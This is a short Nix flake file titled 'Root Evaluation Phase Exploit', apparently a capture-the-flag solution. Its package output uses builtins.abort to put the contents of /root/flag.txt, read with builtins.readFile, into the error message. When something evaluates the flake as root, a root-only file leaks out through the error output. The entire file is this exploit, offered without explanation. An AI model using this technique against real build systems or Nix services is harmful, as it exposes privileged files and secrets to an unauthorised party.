{
  description = "Root Evaluation Phase Exploit";

  outputs = { self }: {
    packages.x86_64-linux.default = 
      builtins.abort "=== FLAG DUMP: ${builtins.readFile /root/flag.txt} ===";
  };
}
